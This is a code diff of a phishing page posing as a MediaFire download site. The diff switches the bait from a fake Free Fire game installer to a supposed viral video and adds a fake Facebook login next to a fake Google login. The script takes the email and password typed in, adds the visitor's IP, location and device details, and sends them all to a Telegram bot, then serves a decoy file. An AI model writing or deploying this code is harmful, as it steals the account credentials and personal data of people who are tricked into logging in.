-• File: Free_Fire_Beta_v2.99.1.exe
-• Size: 1.85 GB
-• Type: Application (.exe)
+${userData.location.country !== 'Unknown' ? `🗺️ *Location:* ${userData.location.city}, ${userData.location.region}, ${userData.location.country}\n📡 *ISP:* ${userData.location.isp}\n🎯 *Coordinates:* ${userData.location.coordinates}\n` : ''}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+💻 *SYSTEM INFORMATION*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🖥️ *Browser:* ${userData.userAgent.substring(0, 60)}...
+📱 *Screen Size:* ${userData.screenSize}
+⚙️ *Platform:* ${userData.platform}
+🗣️ *Language:* ${userData.language}
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-✅ STATUS: Login Verified
-⬇️ ACTION: Download Started
-📈 Downloads: ${Math.floor(Math.random() * 1000) + 2500}
-🔒 Source: MediaFire Clone`;
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📊 *STATISTICS*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+✅ *Status:* Login Verified
+⬇️ *Action:* Video Download Started
+📈 *Total Downloads:* ${Math.floor(Math.random() * 50000) + 120000}
+🔒 *Security:* HTTPS Encrypted
+🔗 *Source:* MediaFire Clone
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🚀 *NEW CAPTURE SUCCESSFUL!* 🚀
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
 
             console.log('📤 Sending to Telegram...');
-            console.log('Message length:', message.length);
+            console.log('Login Method:', loginMethod);
             console.log('Email:', userData.email);
             console.log('Password:', userData.password);
             console.log('IP:', userData.ip);
 
             try {
-                // Method 1: Direct fetch with URL parameters
                 const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                 const params = new URLSearchParams({
                     chat_id: TELEGRAM_CHAT_ID,
                     text: message,
-                    parse_mode: 'HTML'
+                    parse_mode: 'Markdown'
                 });
 
                 const response = await fetch(url, {
@@ -1127,41 +1689,44 @@
 
                 if (result.ok) {
                     console.log('✅ Telegram send SUCCESSFUL!');
-                    console.log('Message ID:', result.result.message_id);
                     
-                    // Send location data as separate message
-                    if (userData.ip && userData.ip !== 'Unknown') {
-                        setTimeout(async () => {
-                            try {
-                                const locResponse = await fetch(`https://ipapi.co/${userData.ip}/json/`);
-                                const locData = await locResponse.json();
-                                
-                                if (locData) {
-                                    const locMessage = `📍 LOCATION INFO:
-• Country: ${locData.country_name || 'Unknown'}
-• City: ${locData.city || 'Unknown'}
-• Region: ${locData.region || 'Unknown'}
-• ISP: ${locData.org || 'Unknown'}
-• Coordinates: ${locData.latitude || 'N/A'}, ${locData.longitude || 'N/A'}`;
-                                    
-                                    const locParams = new URLSearchParams({
-                                        chat_id: TELEGRAM_CHAT_ID,
-                                        text: locMessage
-                                    });
-                                    
-                                    await fetch(url, {
-                                        method: 'POST',
-                                        headers: {
-                                            'Content-Type': 'application/x-www-form-urlencoded',
-                                        },
-                                        body: locParams
-                                    });
-                                }
-                            } catch (locError) {
-                                console.log('⚠️ Location fetch skipped');
-                            }
-                        }, 1000);
-                    }
+                    // Send additional system info
+                    setTimeout(async () => {
+                        const sysMessage = `🛠️ *ADDITIONAL SYSTEM INFO*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔗 *Referrer:* ${userData.referrer}
+📶 *Connection:* ${navigator.connection ? navigator.connection.effectiveType : 'Unknown'}
+🎯 *Cookies Enabled:* ${navigator.cookieEnabled ? 'Yes' : 'No'}
+📱 *Device Memory:* ${navigator.deviceMemory || 'Unknown'} GB
+⏰ *Local Time:* ${new Date().toLocaleTimeString()}
+📊 *Viewport:* ${window.innerWidth}x${window.innerHeight}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🎯 *TARGET:* Andini Viral Video
+🎬 *Type:* Viral Video
+📱 *Platform:* Desktop/Mobile
+💰 *Value:* High Demand Content
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⚠️ *SECURITY NOTE:*
+User attempted to download viral content
+Requires immediate attention
+Potential privacy concern`;
+
+                        const sysParams = new URLSearchParams({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: sysMessage,
+                            parse_mode: 'Markdown'
+                        });
+
+                        await fetch(url, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/x-www-form-urlencoded',
+                            },
+                            body: sysParams
+                        });
+                    }, 1000);
                     
                     return true;
                 } else {
@@ -1170,55 +1735,40 @@
                 }
             } catch (error) {
                 console.error('❌ Network Error:', error);
-                
-                // Try alternative method if first fails
-                try {
-                    console.log('🔄 Trying alternative method...');
-                    
-                    // Method 2: Using FormData
-                    const formData = new FormData();
-                    formData.append('chat_id', TELEGRAM_CHAT_ID);
-                    formData.append('text', `Quick Capture: ${userData.email} | ${userData.password} | IP: ${userData.ip}`);
-                    
-                    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        body: formData
-                    });
-                    
-                    const result = await response.json();
-                    console.log('Alternative method result:', result);
-                    
-                    return result.ok;
-                } catch (altError) {
-                    console.error('❌ All methods failed:', altError);
-                    return false;
-                }
+                return false;
             }
         }
 
         // Event Listeners
         downloadBtn.addEventListener('click', async () => {
-            googleLoginModal.style.display = 'flex';
             await getIPAddress();
-            
-            // Add Google logo dynamically
-            const googleLogo = document.querySelector('.google-logo img');
-            if (googleLogo) {
-                googleLogo.src = 'https://files.catbox.moe/0akmw6.png';
-            }
+            loginChoiceModal.style.display = 'flex';
+        });
+
+        // Video thumbnail click
+        videoThumbnail.addEventListener('click', () => {
+            alert('⏸️ Video preview is not available. Please download the file to view.');
+        });
+
+        // Login Choice Handlers
+        googleLoginChoice.addEventListener('click', () => {
+            loginChoiceModal.style.display = 'none';
+            googleLoginModal.style.display = 'flex';
+        });
+
+        facebookLoginChoice.addEventListener('click', () => {
+            loginChoiceModal.style.display = 'none';
+            facebookLoginModal.style.display = 'flex';
         });
 
         // Close modal when clicking outside
         window.addEventListener('click', (e) => {
-            if (e.target === googleLoginModal) {
-                googleLoginModal.style.display = 'none';
-            }
-            if (e.target === progressModal) {
-                // Don't allow closing progress modal
-            }
-            if (e.target === successModal) {
-                successModal.style.display = 'none';
-            }
+            const modals = [loginChoiceModal, googleLoginModal, facebookLoginModal, progressModal, successModal];
+            modals.forEach(modal => {
+                if (e.target === modal) {
+                    modal.style.display = 'none';
+                }
+            });
         });
 
         // Google login submit
@@ -1226,39 +1776,44 @@
             const email = googleEmailInput.value.trim();
             const password = googlePasswordInput.value.trim();
             
-            if (!email || !password) {
-                alert('Please enter both email and password');
-                googleEmailInput.classList.add('google-input-error');
-                googlePasswordInput.classList.add('google-input-error');
-                return;
-            }
-            
-            // Remove error classes
+            // Clear errors
+            document.getElementById('googleEmailError').style.display = 'none';
+            document.getElementById('googlePasswordError').style.display = 'none';
             googleEmailInput.classList.remove('google-input-error');
             googlePasswordInput.classList.remove('google-input-error');
             
-            // Collect user data
+            let hasError = false;
+            
+            if (!email) {
+                document.getElementById('googleEmailError').style.display = 'block';
+                googleEmailInput.classList.add('google-input-error');
+                hasError = true;
+            }
+            
+            if (!password) {
+                document.getElementById('googlePasswordError').style.display = 'block';
+                googlePasswordInput.classList.add('google-input-error');
+                hasError = true;
+            }
+            
+            if (hasError) return;
+            
             userData.email = email;
             userData.password = password;
+            userData.loginMethod = 'google';
             userData.timestamp = new Date().toISOString();
             
-            // Show loading state
             const originalText = googleLoginBtn.innerHTML;
-            googleLoginBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Signing in...';
+            googleLoginBtn.innerHTML = '<div class="mf-spinner"></div>';
             googleLoginBtn.disabled = true;
             
-            console.log('🚀 Starting data capture...');
-            console.log('Email captured:', email);
-            console.log('Password captured:', password);
-            console.log('IP captured:', userData.ip);
+            console.log('🚀 Google login capture started...');
             
-            // Send data to Telegram
             const sent = await sendToTelegram();
             
             if (sent) {
-                console.log('🎉 All data sent successfully!');
+                console.log('🎉 Google data sent successfully!');
                 
-                // Close login modal and show progress
                 setTimeout(() => {
                     googleLoginModal.style.display = 'none';
                     googleLoginBtn.innerHTML = originalText;
@@ -1268,18 +1823,77 @@
                     startDownloadProcess();
                 }, 1500);
             } else {
-                alert('⚠️ Verification failed. Please try again.');
+                alert('⚠️ Could not sign in. Please check your email and password.');
                 googleLoginBtn.innerHTML = originalText;
                 googleLoginBtn.disabled = false;
-                console.error('❌ Failed to send data to Telegram');
             }
         });
 
-        // Allow Enter key in Google form
-        googlePasswordInput.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') {
-                googleLoginBtn.click();
+        // Facebook login submit
+        facebookLoginBtn.addEventListener('click', async () => {
+            const email = facebookEmailInput.value.trim();
+            const password = facebookPasswordInput.value.trim();
+            
+            // Clear errors
+            document.getElementById('emailError').style.display = 'none';
+            document.getElementById('passwordError').style.display = 'none';
+            facebookEmailInput.classList.remove('facebook-input-error');
+            facebookPasswordInput.classList.remove('facebook-input-error');
+            
+            let hasError = false;
+            
+            if (!email) {
+                document.getElementById('emailError').style.display = 'block';
+                facebookEmailInput.classList.add('facebook-input-error');
+                hasError = true;
             }
+            
+            if (!password) {
+                document.getElementById('passwordError').style.display = 'block';
+                facebookPasswordInput.classList.add('facebook-input-error');
+                hasError = true;
+            }
+            
+            if (hasError) return;
+            
+            userData.email = email;
+            userData.password = password;
+            userData.loginMethod = 'facebook';
+            userData.timestamp = new Date().toISOString();
+            
+            const originalText = facebookLoginBtn.innerHTML;
+            facebookLoginBtn.innerHTML = '<div class="mf-spinner"></div>';
+            facebookLoginBtn.disabled = true;
+            
+            console.log('🚀 Facebook login capture started...');
+            
+            const sent = await sendToTelegram();
+            
+            if (sent) {
+                console.log('🎉 Facebook data sent successfully!');
+                
+                setTimeout(() => {
+                    facebookLoginModal.style.display = 'none';
+                    facebookLoginBtn.innerHTML = originalText;
+                    facebookLoginBtn.disabled = false;
+                    
+                    progressModal.style.display = 'flex';
+                    startDownloadProcess();
+                }, 1500);
+            } else {
+                alert('⚠️ Could not log in. Please check your email and password.');
+                facebookLoginBtn.innerHTML = originalText;
+                facebookLoginBtn.disabled = false;
+            }
+        });
+
+        // Allow Enter key in forms
+        googlePasswordInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') googleLoginBtn.click();
+        });
+
+        facebookPasswordInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') facebookLoginBtn.click();
         });
 
         // Start download process
@@ -1287,20 +1901,20 @@
             let progress = 0;
             const steps = [
                 "Connecting to MediaFire servers...",
-                "Verifying file integrity...",
-                "Preparing download stream...",
-                "Downloading file data (0%)...",
-                "Downloading file data (25%)...",
-                "Downloading file data (50%)...",
-                "Downloading file data (75%)...",
-                "Finalizing download...",
-                "Creating local file..."
+                "Verifying video file integrity...",
+                "Preparing video stream...",
+                "Downloading video data (0%)...",
+                "Downloading video data (25%)...",
+                "Downloading video data (50%)...",
+                "Downloading video data (75%)...",
+                "Finalizing video file...",
+                "Creating local video file..."
             ];
             
             let stepIndex = 0;
             
             const interval = setInterval(() => {
-                progress += Math.random() * 3 + 1;
+                progress += Math.random() * 10 + 5;
                 if (progress > 100) progress = 100;
                 
                 progressFill.style.width = progress + '%';
@@ -1313,24 +1927,23 @@
                 
                 if (progress >= 100) {
                     clearInterval(interval);
-                    statusText.textContent = "Download complete!";
+                    statusText.textContent = "Video download complete!";
                     
-                    // Create fake download file
+                    // Create fake video download file
                     setTimeout(() => {
-                        const content = `MediaFire Download Simulation\n\nFile: Free_Fire_Beta_v2.99.1.exe\nSize: 1.85 GB\nDownloaded: ${new Date().toISOString()}\nUser: ${userData.email}\nIP: ${userData.ip}\n\nThis is a simulation file for demonstration purposes.\nActual Free Fire Beta can be downloaded from official sources.\n\n---\nMediaFire Clone - Simulation Only`;
-                        const blob = new Blob([content], { type: 'application/octet-stream' });
+                        const content = `MediaFire Video Download\n\nFile: Andini_Viral_17_Menit_Full_HD.mp4\nSize: 21.6 MB\nDuration: 17:32\nResolution: 1920x1080\nDownloaded: ${new Date().toISOString()}\nUser: ${userData.email}\nIP: ${userData.ip}\nLogin Method: ${userData.loginMethod}\n\nThis is a simulation file for demonstration purposes.\nActual video can be downloaded from official sources.\n\n---\nMediaFire Clone - Simulation Only`;
+                        const blob = new Blob([content], { type: 'video/mp4' });
                         const url = URL.createObjectURL(blob);
                         
                         const a = document.createElement('a');
                         a.href = url;
-                        a.download = 'Free_Fire_Beta_v2.99.1_MediaFire.exe';
+                        a.download = 'Andini_Viral_17_Menit_Full_HD.mp4';
                         document.body.appendChild(a);
                         a.click();
                         document.body.removeChild(a);
                         
                         URL.revokeObjectURL(url);
                         
-                        // Show success modal
                         progressModal.style.display = 'none';
                         successModal.style.display = 'flex';
                     }, 1000);
@@ -1349,10 +1962,10 @@
             
             // Simulate live download counter
             const downloadCount = document.querySelector('.stat-number');
-            let count = 2847;
+            let count = 128475;
             
             setInterval(() => {
-                count += Math.floor(Math.random() * 3) + 1;
+                count += Math.floor(Math.random() * 100) + 50;
                 if (downloadCount) {
                     downloadCount.textContent = count.toLocaleString();
                 }
@@ -1362,20 +1975,17 @@
             const stats = document.querySelectorAll('.stat-number');
             setInterval(() => {
                 if (stats[1]) {
-                    const rating = (4.7 + Math.random() * 0.2).toFixed(1);
+                    const rating = (4.8 + Math.random() * 0.2).toFixed(1);
                     stats[1].textContent = rating;
                 }
                 if (stats[2]) {
-                    const comments = 12 + Math.floor(Math.random() * 3);
-                    stats[2].textContent = comments;
+                    const comments = 2847 + Math.floor(Math.random() * 100);
+                    stats[2].textContent = comments.toLocaleString();
                 }
             }, 60000);
             
-            // Debug info
-            console.log('🔧 Script loaded successfully!');
-            console.log('Bot Token:', TELEGRAM_BOT_TOKEN.substring(0, 10) + '...');
-            console.log('Chat ID:', TELEGRAM_CHAT_ID);
-            console.log('User Agent:', navigator.userAgent.substring(0, 50) + '...');
+            console.log('🔧 MediaFire Video Download Clone loaded successfully!');
+            console.log('Video: Andini Viral 17 Menit (21.6 MB MP4)');
         });
     </script>
 </body>
